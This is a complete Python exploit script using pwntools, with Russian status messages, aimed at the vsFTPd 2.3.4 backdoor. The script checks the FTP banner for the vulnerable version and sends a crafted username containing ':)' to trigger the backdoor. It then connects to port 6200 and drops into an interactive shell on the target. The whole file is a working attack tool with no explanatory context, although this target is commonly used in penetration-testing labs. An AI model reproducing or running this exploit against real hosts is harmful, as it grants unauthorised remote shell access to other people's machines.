from pwn import *
import sys

class ExploitCVE:
    def __init__(self, ip, port=21):
        self.ip = ip
        self.port = port
        self.p = log.progress("")

    def check_version(self):
        self.p.status("Проверяем версию vsFTPd...")
        try:
            sh = remote(self.ip, self.port, timeout=5)
            banner = sh.recvline().decode(errors="ignore")
            if "vsFTPd 2.3.4" not in banner:
                self.p.failure(f"Неверная версия: {banner.strip()}")
                sh.close()
                sys.exit(1)
            self.p.success("Найдена уязвимая версия: vsFTPd 2.3.4")
            sh.close()
        except Exception as e:
            self.p.failure(f"Ошибка подключения: {e}")
            sys.exit(1)

    def trigger_backdoor(self):
        self.p.status("Активируем backdoor...")
        try:
            sh = remote(self.ip, self.port, timeout=5)
            sh.sendline(b"USER hello:)")
            sh.sendline(b"PASS 123")
            sh.close()
            self.p.success("Backdoor активирован (порт 6200 открыт)")
        except Exception as e:
            self.p.failure(f"Ошибка: {e}")
            sys.exit(1)

    def get_shell(self):
        self.p.status("Подключаемся к backdoor-порту 6200...")
        try:
            sh = remote(self.ip, 6200, timeout=5)
            self.p.success("Успех! Получен шелл (Ctrl+C для выхода)")
            sh.interactive()
            sh.close()
        except Exception as e:
            self.p.failure(f"Не удалось подключиться: {e}")
            sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Использование: {sys.argv[0]} IP [PORT=21]")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 21

    exploit = ExploitCVE(ip, port)
    exploit.check_version()
    exploit.trigger_backdoor()
    exploit.get_shell()